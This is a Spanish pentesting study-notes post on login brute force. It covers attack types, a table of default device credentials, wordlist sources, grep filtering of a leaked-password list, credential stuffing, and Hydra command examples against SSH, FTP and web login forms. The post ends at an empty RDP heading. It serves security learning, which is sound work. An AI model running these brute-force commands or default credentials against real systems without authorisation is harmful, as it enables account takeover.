---
title: Login Brute Force
date: 2026-02-07 11:00:00 +0000
categories: [Web, apuntes]
tags: [pentesting, web, passwords, brute force]
image:
  path: /assets/img/posts/login-brute-force/cabecera.jpg
  alt: cabecera
description: >
   Fuerza bruta sobre diferentes inicios de sesión

pin: false  
toc: true   
math: false 
mermaid: false 
---

En ciberseguridad, el ataque de fuerza bruta es un método de prueba y error utilizado para descifrar contraseñas, credenciales de inicio de sesión o claves de cifrado. Consiste en probar sistemáticamente todas las combinaciones posibles de caracteres hasta encontrar la correcta.

El éxito de un ataque de fuerza bruta depende de varios factores:
  
**La complejidad de la contraseña o clave**. Las contraseñas más largas con una combinación de letras mayúsculas y minúsculas, números y símbolos son exponencialmente más difíciles de descifrar.

**La potencia computacional de que dispone el atacante.** Los ordenadores modernos y el hardware especializado pueden probar miles de millones de combinaciones por segundo, lo que reduce significativamente el tiempo necesario para llevar a cabo un ataque con éxito.

**Las medidas de seguridad implementadas**. Los bloqueos de cuentas, los CAPTCHA y otras defensas pueden ralentizar o incluso frustrar los intentos de fuerza bruta.

## Tipos de fuerza bruta

| **Método**                  | **Descripción**                                                                                                           | **Ejemplo**                                                                                                        | **Mejor uso cuando...**                                                                              |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------- |
| **Simple Brute Force**      | Prueba sistemáticamente todas las combinaciones posibles de caracteres dentro de un conjunto y longitud definidos.        | Probar todas las combinaciones de letras minúsculas ('a'-'z') para contraseñas de 4 a 6 caracteres.                | No hay información previa sobre la contraseña y los recursos computacionales son abundantes.         |
| **Dictionary Attack**       | Utiliza una lista precompilada de palabras, frases y contraseñas comunes.                                                 | Probar contraseñas de una lista como `rockyou.txt` contra un formulario de inicio de sesión.                       | Es probable que el objetivo use una contraseña débil o predecible basada en patrones comunes.        |
| **Hybrid Attack**           | Combina elementos de fuerza bruta simple y ataques de diccionario, añadiendo prefijos o sufijos a las palabras.           | Añadir números o caracteres especiales al final de palabras de una lista de diccionario.                           | El objetivo podría usar una versión ligeramente modificada de una contraseña común.                  |
| **Credential Stuffing**     | Aprovecha credenciales filtradas de un servicio para intentar acceder a otros, asumiendo la reutilización de contraseñas. | Usar una lista de usuarios/contraseñas de una brecha de datos para intentar loguearse en diversos servicios.       | Se dispone de un gran conjunto de credenciales filtradas y se sospecha reutilización de contraseñas. |
| **Password Spraying**       | Intenta un conjunto pequeño de contraseñas comunes contra una gran cantidad de nombres de usuario.                        | Probar `Password123!` o `Winter2024` contra todos los usuarios de una organización.                                | Existen políticas de bloqueo de cuenta y se busca evitar la detección distribuyendo los intentos.    |
| **Rainbow Table Attack**    | Utiliza tablas precomputadas de hashes para revertirlos y recuperar contraseñas en texto plano rápidamente.               | Comparar hashes capturados contra una tabla que contiene hashes precalculados de millones de combinaciones.        | Se necesita crackear una gran cantidad de hashes y se dispone de espacio de almacenamiento masivo.   |
| **Reverse Brute Force**     | Prueba una única contraseña contra múltiples nombres de usuario (similar al spraying pero más focalizado).                | Usar una contraseña filtrada de un servicio para intentar entrar en múltiples cuentas con diferentes usuarios.     | Existe una sospecha firme de que una contraseña específica se reutiliza en varias cuentas.           |
| **Distributed Brute Force** | Distribuye la carga de trabajo de fuerza bruta entre múltiples ordenadores o dispositivos para acelerar el proceso.       | Utilizar un cluster de GPUs para realizar un ataque, aumentando drásticamente las combinaciones por segundo (H/s). | La contraseña es altamente compleja y una sola máquina carece de la potencia de cálculo necesaria.   |

## Los peligros de las credenciales predeterminadas

Un aspecto crítico de la seguridad de las contraseñas que a menudo se pasa por alto es el peligro que representan las contraseñas predeterminadas. Estas contraseñas preestablecidas vienen con varios dispositivos, software o servicios en línea. A menudo son simples y fáciles de adivinar, lo que las convierte en un objetivo principal para los atacantes.

Las contraseñas predeterminadas aumentan significativamente la tasa de éxito de los ataques de fuerza bruta. Los atacantes pueden aprovechar las listas de contraseñas predeterminadas comunes, lo que reduce drásticamente el espacio de búsqueda y acelera el proceso de descifrado. En algunos casos, los atacantes ni siquiera necesitan realizar un ataque de fuerza bruta; pueden probar unas pocas contraseñas predeterminadas comunes y obtener acceso con un mínimo esfuerzo.

|**Dispositivo / Fabricante**|**Usuario por Defecto**|**Contraseña por Defecto**|**Tipo de Dispositivo**|
|---|---|---|---|
|**Linksys Router**|admin|admin|Router Inalámbrico|
|**D-Link Router**|admin|admin|Router Inalámbrico|
|**Netgear Router**|admin|password|Router Inalámbrico|
|**TP-Link Router**|admin|admin|Router Inalámbrico|
|**Cisco Router**|cisco|cisco|Router de Red|
|**Asus Router**|admin|admin|Router Inalámbrico|
|**Belkin Router**|admin|password|Router Inalámbrico|
|**Zyxel Router**|admin|1234|Router Inalámbrico|
|**Samsung SmartCam**|admin|4321|Cámara IP|
|**Hikvision DVR**|admin|12345|Grabador de Vídeo Digital (DVR)|
|**Axis IP Camera**|root|pass|Cámara IP|
|**Ubiquiti UniFi AP**|ubnt|ubnt|Punto de Acceso Inalámbrico|
|**Canon Printer**|admin|admin|Impresora de Red|
|**Honeywell Thermostat**|admin|1234|Termostato Inteligente|
|**Panasonic DVR**|admin|12345|Grabador de Vídeo Digital (DVR)|

Además de las contraseñas predeterminadas, los nombres de usuario predeterminados son otro motivo importante de preocupación en materia de seguridad. Los fabricantes suelen enviar los dispositivos con nombres de usuario preestablecidos, como «admin», «root» o «user». Es posible que haya observado en la tabla anterior cuántos utilizan nombres de usuario comunes. Estos nombres de usuario son ampliamente conocidos y suelen publicarse en la documentación o estar fácilmente disponibles en Internet. SecLists mantiene una lista de nombres de usuario comunes en top-usernames-shortlist.txt

Incluso cuando se cambian las contraseñas predeterminadas, conservar el nombre de usuario predeterminado sigue dejando los sistemas vulnerables a los ataques. Esto reduce drásticamente la superficie de ataque, ya que el hacker puede saltarse el proceso de adivinar los nombres de usuario y centrarse únicamente en la contraseña.

## El Rol de la Seguridad de Contraseñas en el Pentesting

En un escenario de fuerza bruta, la robustez de las contraseñas del objetivo se convierte en el principal obstáculo del atacante. Una contraseña débil es similar a una cerradura frágil: fácil de forzar con un esfuerzo mínimo. Por el contrario, una contraseña fuerte actúa como una bóveda fortificada, exigiendo significativamente más tiempo y recursos para ser vulnerada.

Para un **pentester**, esto se traduce en una comprensión profunda de la postura de seguridad del objetivo:

- **Evaluación de la Vulnerabilidad del Sistema:** Las políticas de contraseñas (o la ausencia de ellas) y la probabilidad de que los usuarios empleen credenciales débiles definen directamente el éxito potencial de un ataque de fuerza bruta.
    
- **Selección Estratégica de Herramientas:** La complejidad de las contraseñas dicta qué herramientas y metodologías desplegará el auditor. Un ataque de diccionario simple puede ser suficiente para contraseñas débiles, mientras que un enfoque híbrido sofisticado será necesario para crackear las más robustas.
    
- **Asignación de Recursos:** El tiempo estimado y la potencia de cálculo necesaria están intrínsecamente ligados a la complejidad de los hashes. Este conocimiento es esencial para una planificación y gestión de recursos efectiva.
    
- **Explotación de Puntos Débiles:** Las contraseñas por defecto son a menudo el talón de Aquiles de un sistema. La capacidad del pentester para identificar y aprovechar estas credenciales predecibles puede proporcionar un punto de entrada rápido a la red interna.
    

## Ataques de fuerza bruta

Para comprender realmente el desafío que supone el ataque de fuerza bruta, es esencial entender las matemáticas subyacentes. La siguiente fórmula determina el número total de combinaciones posibles para una contraseña:

```mathml
Combinaciones posibles = Tamaño del conjunto de caracteres^Longitud de la contraseña
```

Por ejemplo, una contraseña de 6 caracteres que solo utilice letras minúsculas (conjunto de caracteres de 26) tiene 26^6 (aproximadamente 300 millones) combinaciones posibles. Por el contrario, una contraseña de 8 caracteres con el mismo conjunto de caracteres tiene 26^8 (aproximadamente 200 000 millones) combinaciones. Añadir letras mayúsculas, números y símbolos al conjunto de caracteres amplía aún más el espacio de búsqueda de forma exponencial.

Este crecimiento exponencial en el número de combinaciones pone de relieve la importancia de la longitud y la complejidad de la contraseña. Incluso un pequeño aumento en la longitud o la inclusión de tipos de caracteres adicionales puede aumentar drásticamente el tiempo y los recursos necesarios para llevar a cabo con éxito un ataque de fuerza bruta.

Consideremos algunos escenarios para ilustrar el impacto de la longitud de la contraseña y el conjunto de caracteres en el espacio de búsqueda:

|**Nivel de Complejidad**|**Longitud**|**Conjunto de Caracteres**|**Combinaciones Posibles**|
|---|---|---|---|
|**Corta y Simple**|6|Letras minúsculas (a-z)|$26^6 \approx 308,915,776$|
|**Larga pero Simple**|8|Letras minúsculas (a-z)|$26^8 \approx 208,827,064,576$|
|**Añadiendo Complejidad**|8|Minúsculas y mayúsculas (a-z, A-Z)|$52^8 \approx 53,459,728,531,456$|
|**Máxima Complejidad**|12|Letras (Aa-Zz), números y símbolos|$94^{12} \approx 4.75 \times 10^{23}$|
incluso un ligero aumento en la longitud de la contraseña o la inclusión de tipos de caracteres adicionales amplía drásticamente el espacio de búsqueda. Esto aumenta significativamente el número de combinaciones posibles que un atacante debe probar, lo que hace que el ataque por fuerza bruta sea cada vez más difícil y lento. Sin embargo, el tiempo que se tarda en descifrar una contraseña no solo depende del tamaño del espacio de búsqueda, sino también de la potencia computacional disponible del atacante.

Cuanto más potente sea el hardware del atacante (por ejemplo, el número de GPU, CPU o recursos informáticos basados en la nube que pueda utilizar), más contraseñas podrá adivinar por segundo. Mientras que una contraseña compleja puede tardar años en descifrarse por fuerza bruta con una sola máquina, un atacante sofisticado que utilice una red distribuida de recursos informáticos de alto rendimiento podría reducir ese tiempo drásticamente.

![Pasted image 20260208110649](/assets/img/posts/login-brute-force/Pasted%20image%2020260208110649.png)

El gráfico anterior ilustra una relación exponencial entre la complejidad de la contraseña y el tiempo necesario para descifrarla. A medida que aumenta la longitud de la contraseña y se amplía el conjunto de caracteres, el número total de combinaciones posibles crece exponencialmente. Esto aumenta considerablemente el tiempo necesario para descifrar la contraseña.

## Ataques de diccionario

La efectividad de un ataque de diccionario reside en su capacidad para explotar la tendencia humana de priorizar contraseñas memorables sobre las seguras. A pesar de las advertencias constantes, muchos individuos siguen optando por credenciales basadas en información fácilmente accesible, como palabras del diccionario, frases comunes, nombres o patrones predecibles. Esta predictibilidad los vuelve vulnerables ante ataques donde el atacante prueba sistemáticamente una lista predefinida de posibles contraseñas contra el sistema objetivo.

El éxito de un ataque de diccionario depende críticamente de la **calidad y especificidad** de la lista de palabras (_wordlist_) utilizada. Una lista bien elaborada y adaptada a la audiencia o al sistema objetivo puede aumentar significativamente la probabilidad de una brecha exitosa.

### Factores Clave de Éxito:

- **Contextualización:** Si el objetivo es un sistema frecuentado por _gamers_, una _wordlist_ enriquecida con terminología y jerga de videojuegos será más efectiva que un diccionario genérico.
    
- **Reflejo del Objetivo:** Cuanto más fielmente refleje la lista las probables elecciones del usuario, mayores serán las posibilidades de éxito.
    
- **Eficiencia sobre Fuerza Bruta:** Al apalancarse en estos _insights_ psicológicos, los atacantes pueden crackear contraseñas que, de otro modo, requerirían un ataque de fuerza bruta impracticable por su duración.
    

En esencia, el poder de un ataque de diccionario reside en convertir la predictibilidad humana en una vulnerabilidad técnica, comprometiendo medidas de seguridad que, en papel, parecen robustas.

## Brute Force vs. Dictionary Attack: Diferencias Fundamentales

La distinción clave entre un ataque de fuerza bruta y uno de diccionario reside en la metodología utilizada para generar los candidatos a contraseña:

- **Fuerza Bruta (Brute Force):** Un ataque de fuerza bruta puro prueba sistemáticamente **cada combinación posible** de caracteres dentro de un conjunto y longitud predeterminados. Aunque este enfoque garantiza el éxito eventual (si se dispone de tiempo infinito), es extremadamente ineficiente y lento contra contraseñas largas o complejas.
    
- **Ataque de Diccionario (Dictionary Attack):** Por el contrario, este ataque emplea una lista precompilada de palabras y frases, reduciendo drásticamente el espacio de búsqueda (_keyspace_). Esta metodología dirigida resulta en un ataque mucho más rápido y eficiente, especialmente cuando se sospecha que el objetivo utiliza términos comunes.

|**Característica**|**Dictionary Attack**|**Brute Force Attack**|**Explicación Técnica**|
|---|---|---|---|
|**Eficiencia**|Considerablemente más rápido y eficiente en recursos.|Extremadamente lento y demanda alto consumo de recursos.|El diccionario utiliza una lista definida, estrechamente vinculada a la probabilidad, reduciendo el espacio de búsqueda.|
|**Objetivo (Targeting)**|Altamente adaptable y personalizable según el objetivo.|Sin capacidad inherente de personalización.|Las _wordlists_ pueden incluir OSINT (nombres de empresa, empleados), aumentando la tasa de éxito drásticamente.|
|**Efectividad**|Excepcionalmente eficaz contra contraseñas débiles o comunes.|Eficaz contra cualquier contraseña, dado el tiempo suficiente.|Si la clave está en el diccionario, se halla al instante. La fuerza bruta es universal pero impráctica para contraseñas complejas.|
|**Limitaciones**|Inútil contra contraseñas complejas o generadas aleatoriamente.|A menudo impracticable para contraseñas largas por el tiempo de cómputo.|Una clave aleatoria no aparecerá en un diccionario. El número astronómico de combinaciones hace que la fuerza bruta sea inviable en el mundo real.|
## Construcción y Utilización de Diccionarios (Wordlists)

La calidad de tu ataque depende directamente de la inteligencia aplicada a tus listas de palabras. Los diccionarios pueden obtenerse de diversas fuentes:

### 1. Listas Disponibles Públicamente

Internet alberga una plétora de diccionarios de acceso gratuito que incluyen colecciones de contraseñas comunes y credenciales filtradas en brechas de datos.

- **Repositorios clave:** Proyectos como **SecLists** son fundamentales, ya que ofrecen listas categorizadas por protocolos, nombres de usuario y contextos de ataque específicos.
    

### 2. Listas Construidas a Medida (Custom)

Un pentester de alto nivel genera sus propios diccionarios aprovechando la información obtenida durante la fase de **reconocimiento (Recon)**.

- **Fuentes de datos:** Intereses del objetivo, hobbies, información personal, nombres de mascotas o nomenclaturas internas de la empresa.
    
- **Herramientas recomendadas:** El uso de `CeWL` para realizar _scraping_ del sitio web del objetivo o `CUPP` para generar perfiles basados en datos personales.
    

### 3. Listas Especializadas

Estas listas se refinan para atacar industrias, aplicaciones o empresas específicas.

- **Contexto:** Al centrarse en contraseñas que tienen una mayor probabilidad de uso dentro de un entorno particular (ej. términos médicos para un hospital o terminología legal para un bufete), la tasa de éxito aumenta drásticamente.
    

### 4. Listas Preexistentes en Distribuciones

Ciertas herramientas y marcos de trabajo ya vienen con diccionarios preempaquetados.

- **Ejemplos:** Distribuciones como **ParrotSec** o Kali Linux incluyen por defecto el archivo `rockyou.txt`, una colección masiva de millones de contraseñas filtradas que sigue siendo un estándar para pruebas rápidas de seguridad.

| **Wordlist**                                  | **Descripción**                                                                                  | **Uso Típico**                                                     | **Fuente**                                                                                                                       |
| --------------------------------------------- | ------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------- |
| **rockyou.txt**                               | El estándar de la industria; contiene millones de contraseñas filtradas de la brecha de RockYou. | Ataques de fuerza bruta de contraseñas por probabilidad.           | [Dataset RockYou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)                             |
| **top-usernames-shortlist.txt**               | Una lista concisa de los nombres de usuario más comunes (admin, root, etc.).                     | Intentos rápidos de descubrimiento de usuarios.                    | [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt)                         |
| **xato-net-10-million-usernames.txt**         | Una lista extensiva de 10 millones de nombres de usuario.                                        | Fuerza bruta exhaustiva de nombres de usuario.                     | [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt)                   |
| **2023-200_most_used_passwords.txt**          | Las 200 contraseñas más utilizadas según datos de 2023.                                          | Ataques de _spraying_ rápidos contra cuentas bloqueables.          | [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt) |
| **Default-Credentials/default-passwords.txt** | Combinaciones de fábrica para routers, cámaras y software.                                       | Identificación de credenciales por defecto en servicios expuestos. | [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.txt)           |

## Ataques Híbridos: Explotando la Predictibilidad del Usuario

Muchas organizaciones implementan políticas que obligan a los usuarios a cambiar sus contraseñas periódicamente para mejorar la seguridad. Sin embargo, estas políticas pueden fomentar inadvertidamente patrones de contraseñas predecibles si los usuarios no cuentan con la formación adecuada en higiene de credenciales.

Lamentablemente, una práctica insegura y muy extendida es realizar **modificaciones menores** a la contraseña anterior cuando el sistema exige un cambio. Esto suele manifestarse añadiendo un número o un carácter especial al final de la contraseña actual. Por ejemplo, un usuario con la contraseña inicial `Verano2023` podría actualizarla a `Verano2023!` o `Verano2024`.

Este comportamiento predecible crea una brecha que los **ataques híbridos** explotan de manera implacable. Los atacantes capitalizan esta tendencia humana empleando técnicas sofisticadas que combinan la eficiencia de los ataques de diccionario con la exhaustividad de la fuerza bruta, aumentando drásticamente la probabilidad de éxito.

### Ataques Híbridos en Acción: Un Caso Práctico

Para ilustrar esto, consideremos a un atacante que tiene como objetivo una organización conocida por imponer cambios de contraseña regulares.

![Pasted image 20260208113908](/assets/img/posts/login-brute-force/Pasted%20image%2020260208113908.png)

1. **Fase de Diccionario:** El atacante comienza lanzando un ataque de diccionario utilizando una _wordlist_ curada con contraseñas comunes, términos específicos de la industria e información obtenida mediante **OSINT** sobre la empresa y sus empleados. Esta fase busca identificar rápidamente el "fruto maduro" (_low-hanging fruit_): cuentas protegidas por credenciales extremadamente débiles.
    
2. **Transición Híbrida:** Si el ataque de diccionario falla, se transita hacia un modo de fuerza bruta estratégica. En lugar de generar combinaciones aleatorias desde cero, el ataque modifica las palabras de la lista original.
    
3. **Mutación de Candidatos:** Se aplican reglas para añadir números, caracteres especiales o incrementar años (como en el ejemplo de `Verano2023` → `Verano2024!`), cubriendo las variaciones que los usuarios suelen emplear para cumplir con las políticas internas.
    

Este enfoque de fuerza bruta dirigida reduce drásticamente el espacio de búsqueda en comparación con un ataque tradicional, manteniendo una alta probabilidad de éxito al alinearse con la psicología del usuario.

### El Poder de los Ataques Híbridos

La efectividad de los ataques híbridos reside en su adaptabilidad y eficiencia. Estos combinan las fortalezas de las técnicas de diccionario y de fuerza bruta para maximizar las probabilidades de éxito, especialmente cuando los usuarios siguen patrones predecibles.

Es fundamental entender que los ataques híbridos no se limitan solo a cambios de contraseña. Pueden adaptarse para explotar cualquier patrón observado o sospechado dentro de una organización.

#### Escenario de Auditoría: Política de Contraseñas del Objetivo

Si el objetivo impone la siguiente política, un ataque de diccionario simple fallará, pero un ataque híbrido (o basado en reglas) será letal:

- **Longitud mínima:** 8 caracteres.
    
- **Requisito 1:** Al menos una letra mayúscula.
    
- **Requisito 2:** Al menos una letra minúscula.
    
- **Requisito 3:** Al menos un número.

Para extraer solo las contraseñas que se adhieren a una política específica, podemos aprovechar las potentes herramientas de línea de comandos disponibles en sistemas Linux/Unix, específicamente `grep` combinado con **Regex**..

##### 1. Descarga del Diccionario

Primero, obtenemos el recurso desde SecLists:

```
$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt
```

##### 2. Aplicación de Filtros en Cadena

###### Paso A: Longitud Mínima (8 caracteres)

El primer comando `grep` filtra el requisito principal de longitud.

```
$ grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt
```

> **Explicación técnica:** La expresión regular `^.{8,}$` asegura que solo pasen las contraseñas con 8 o más caracteres.

###### Paso B: Letras Mayúsculas

Refinamos la lista exigiendo al menos una mayúscula.

```
$ grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
```

> **Explicación técnica:** `[A-Z]` descarta cualquier línea que no contenga caracteres en mayúscula.

###### Paso C: Letras Minúsculas

Garantizamos el cumplimiento del requisito de minúsculas.

```
$ grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
```

###### Paso D: Requisito Numérico

Finalmente, filtramos para conservar solo aquellas que contienen dígitos.

```
$ grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
```

##### 3. Resultados y Eficiencia

Al finalizar, verificamos el tamaño de la lista resultante:

```
$ wc -l darkweb2017-number.txt
89 darkweb2017-number.txt
```

Como demuestra el resultado, filtrar meticulosamente una lista de 10,000 contraseñas contra una política específica ha reducido nuestro objetivo a solo **89 candidatos**. Esta reducción drástica del espacio de búsqueda representa un aumento significativo en la eficiencia: un ataque más rápido y enfocado optimiza los recursos computacionales y aumenta drásticamente la probabilidad de éxito.

Comando combinado:

```bash
grep -E '^.{8,}$' darkweb2017-top10000.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' > wordlist_final.txt
```

## Credential Stuffing: Aprovechando Datos Robados para el Acceso No Autorizado

Los ataques de _Credential Stuffing_ (relleno de credenciales) explotan la desafortunada realidad de que muchos usuarios reutilizan la misma contraseña en múltiples cuentas. Esta práctica generalizada, impulsada por la comodidad y la dificultad de gestionar numerosas credenciales únicas, crea un terreno fértil para los atacantes.

### El Proceso del Ataque

Es un proceso de varias etapas que sigue esta lógica:

- **Adquisición de Datos:** El ataque comienza con la obtención de listas de usuarios y contraseñas comprometidos. Estas listas provienen de brechas de datos a gran escala, campañas de _phishing_ o malware.
    
- **Fuentes de Información:** Repositorios públicos como `rockyou` o los encontrados en `SecLists` sirven como punto de partida, ofreciendo una mina de oro de contraseñas de uso común.
    
- **Identificación de Objetivos:** Los atacantes seleccionan servicios donde las víctimas suelen tener cuentas, como redes sociales, proveedores de correo, banca en línea y sitios de comercio electrónico.
    
- **Automatización:** Se utilizan scripts o herramientas para probar sistemáticamente las credenciales robadas, a menudo imitando el comportamiento humano para evadir sistemas de detección.
    
- **Acceso y Explotación:** Un "match" exitoso otorga acceso no autorizado, permitiendo desde el robo de identidad y fraude financiero hasta el uso de la cuenta como trampolín para propagar malware.
    

### El Problema de la Reutilización de Contraseñas

El éxito del _Credential Stuffing_ se basa enteramente en la reutilización de contraseñas. Cuando un usuario confía en claves idénticas o similares, una brecha en una plataforma genera un **efecto dominó** que compromete toda su presencia digital. Esto subraya la necesidad urgente de utilizar contraseñas fuertes y únicas, además de medidas proactivas como la autenticación de múltiples factores (MFA).


## Hydra

**Hydra** es una herramienta de cracking de logins de red extremadamente rápida que soporta numerosos protocolos de ataque. Es una herramienta versátil capaz de realizar ataques de fuerza bruta contra una amplia gama de servicios, incluyendo aplicaciones web, servicios de login remoto como SSH y FTP, e incluso bases de datos.

### ¿Por qué es la herramienta preferida?

La popularidad de Hydra se debe a tres pilares fundamentales:

- **Velocidad y Eficiencia:** Hydra utiliza conexiones paralelas para realizar múltiples intentos de inicio de sesión simultáneamente, lo que acelera significativamente el proceso de cracking.
    
- **Flexibilidad:** Soporta una vasta cantidad de protocolos y servicios, lo que la hace adaptable a diversos escenarios de ataque.
    
- **Facilidad de Uso:** A pesar de su potencia, Hydra es relativamente sencilla de operar gracias a una interfaz de línea de comandos directa y una sintaxis clara.
    

### Instalación y Verificación

Hydra suele venir preinstalado en las distribuciones de pentesting más populares. Puedes verificar si está presente ejecutando:

```
$ hydra -h
```

Si no está instalado, puedes obtenerlo desde el repositorio oficial:

```
$ sudo apt-get -y update
$ sudo apt-get -y install hydra 
```

### Guía de Sintaxis Básica de Hydra

La estructura fundamental de un comando en Hydra es la siguiente:`hydra [opciones_login] [opciones_password] [opciones_ataque] [opciones_servicio]`

| **Parámetro**              | **Explicación**                                                                                        | **Ejemplo de Uso**                                  |
| -------------------------- | ------------------------------------------------------------------------------------------------------ | --------------------------------------------------- |
| **-l LOGIN** o **-L FILE** | **Opciones de login:** Especifica un único nombre de usuario (`-l`) o un archivo con una lista (`-L`). | `hydra -l admin ...` o `hydra -L users.txt ...`     |
| **-p PASS** o **-P FILE**  | **Opciones de password:** Define una contraseña única (`-p`) o un archivo de diccionario (`-P`).       | `hydra -p pass123 ...` o `hydra -P rockyou.txt ...` |
| **-t TASKS**               | **Tareas:** Define el número de tareas paralelas (hilos). Aumenta la velocidad, pero también el ruido. | `hydra -t 4 ...`                                    |
| **-f**                     | **Modo rápido:** Detiene el ataque inmediatamente tras encontrar el primer login exitoso.              | `hydra -f ...`                                      |
| **-s PORT**                | **Puerto:** Especifica un puerto no estándar para el servicio objetivo.                                | `hydra -s 2222 ...`                                 |
| **-v** o **-V**            | **Salida detallada (Verbose):** Muestra intentos y resultados. `-V` ofrece el máximo detalle.          | `hydra -v ...` o `hydra -V ...`                     |
| **service://server**       | **Objetivo:** Define el protocolo (ssh, http, ftp, etc.) y la dirección IP o hostname.                 | `hydra ssh://10.10.10.15/`                          |
| **OPT**                    | **Opciones específicas:** Parámetros adicionales requeridos por ciertos servicios (como métodos POST). | `hydra http-post-form://target.com...`              |

Los servicios de Hydra definen los protocolos específicos que la herramienta puede atacar, permitiéndole interactuar con diversos mecanismos de autenticación al comprender sus patrones de comunicación.

|**Servicio Hydra**|**Protocolo**|**Descripción**|**Ejemplo de Comando**|
|---|---|---|---|
|**ftp**|FTP|Brute-force para servicios de transferencia de archivos.|`hydra -l admin -P pass.txt ftp://192.168.1.100`|
|**ssh**|SSH|Ataque a servicios de login remoto seguro.|`hydra -l root -P pass.txt ssh://192.168.1.100`|
|**http-get/post**|Web Services|Fuerza bruta contra formularios web (GET o POST).|`hydra -l admin -P pass.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"`|
|**smtp**|SMTP|Ataque a servidores de envío de correo electrónico.|`hydra -l admin -P pass.txt smtp://mail.server.com`|
|**pop3**|POP3|Fuerza bruta contra servicios de recuperación de correo.|`hydra -l user@ex.com -P pass.txt pop3://mail.server.com`|
|**imap**|IMAP|Acceso remoto a bandejas de entrada de correo.|`hydra -l user@ex.com -P pass.txt imap://mail.server.com`|
|**mysql**|MySQL|Intento de compromiso de credenciales de bases de datos MySQL.|`hydra -l root -P pass.txt mysql://192.168.1.100`|
|**mssql**|MS SQL|Ataque contra servidores de base de datos de Microsoft.|`hydra -l sa -P pass.txt mssql://192.168.1.100`|
|**vnc**|VNC|Fuerza bruta contra servicios de escritorio remoto VNC.|`hydra -P pass.txt vnc://192.168.1.100`|
|**rdp**|RDP|Ataque al protocolo de escritorio remoto de Microsoft.|`hydra -l admin -P pass.txt rdp://192.168.1.100`|

### Fuerza Bruta contra Autenticación HTTP

Imagina que tienes la tarea de probar la seguridad de un sitio web que utiliza autenticación básica de HTTP en `www.example.com`. Dispones de una lista de nombres de usuario potenciales almacenada en `usernames.txt` y sus correspondientes contraseñas en `passwords.txt`. Para lanzar un ataque de fuerza bruta contra este servicio HTTP, utiliza el siguiente comando de Hydra:

```
$ hydra -L usernames.txt -P passwords.txt www.example.com http-get
```

#### Desglose del Comando

Este comando instruye a Hydra para:

- **Utilizar la lista de nombres de usuario** del archivo `usernames.txt`.
    
- **Utilizar la lista de contraseñas** del archivo `passwords.txt`.
    
- **Establecer como objetivo** el sitio web `www.example.com`.
    
- **Emplear el módulo `http-get`** para probar la autenticación HTTP.
    

Hydra probará sistemáticamente cada combinación de usuario y contraseña contra el sitio web objetivo hasta descubrir un inicio de sesión válido.

### Ataque a Múltiples Servidores SSH simultáneamente

Considera una situación en la que has identificado varios servidores que podrían ser vulnerables a ataques de fuerza bruta por SSH. Has compilado sus direcciones IP en un archivo llamado `targets.txt` y sospechas que estos servidores podrían utilizar el nombre de usuario por defecto "root" y la contraseña "toor". Para probar todos estos servidores de manera eficiente y simultánea, utiliza el siguiente comando de Hydra:

```
$ hydra -l root -p toor -M targets.txt ssh
```

#### Desglose del comando

Este comando instruye a Hydra para:

- **Utilizar el nombre de usuario** "root".
    
- **Utilizar la contraseña** "toor".
    
- **Apuntar a todas las direcciones IP** enumeradas en el archivo `targets.txt` mediante el flag `-M`.
    
- **Emplear el módulo `ssh`** para ejecutar el ataque.
    

Hydra ejecutará intentos de fuerza bruta en paralelo en cada servidor, lo que acelera significativamente el proceso.

### Prueba de Credenciales FTP en un Puerto No Estándar

Imagina que necesitas evaluar la seguridad de un servidor FTP alojado en `ftp.example.com`, el cual opera en el puerto no estándar **2121**. Tienes listas de posibles nombres de usuario y contraseñas almacenadas en `usernames.txt` y `passwords.txt`, respectivamente. Para probar estas credenciales contra el servicio FTP, utiliza el siguiente comando de Hydra:

```
$ hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```

#### Desglose del Comando

Este comando instruye a Hydra para:

- **Utilizar la lista de nombres de usuario** del archivo `usernames.txt`.
    
- **Utilizar la lista de contraseñas** del archivo `passwords.txt`.
    
- **Apuntar al servicio FTP** en `ftp.example.com` a través del puerto **2121** (usando el flag `-s`).
    
- **Emplear el módulo `ftp`** y proporcionar una salida detallada (`-V`) para un monitoreo exhaustivo del progreso.
    

Hydra intentará validar cada combinación de usuario y contraseña contra el servidor FTP en el puerto especificado.

### Fuerza Bruta contra un Formulario de Inicio de Sesión Web

Supón que tienes la tarea de realizar un ataque de fuerza bruta contra un formulario de inicio de sesión en una aplicación web en `www.example.com`. Sabes que el nombre de usuario es "admin" y los parámetros del formulario para el inicio de sesión son `user=^USER^&pass=^PASS^`. Para realizar este ataque, utiliza el siguiente comando de Hydra:

```
$ hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

#### Desglose del Comando

Este comando instruye a Hydra para:

- **Utilizar el nombre de usuario** "admin".
    
- **Utilizar la lista de contraseñas** del archivo `passwords.txt`.
    
- **Apuntar al formulario de login** en la ruta `/login` del dominio `www.example.com`.
    
- **Emplear el módulo `http-post-form`** con los parámetros de formulario especificados.
    
- **Identificar un inicio de sesión exitoso** mediante el código de estado HTTP **302** (Redirección).
    

Hydra intentará sistemáticamente cada contraseña para la cuenta "admin", verificando si se cumple la condición de éxito especificada.

### Ataque de Fuerza Bruta Avanzado contra RDP

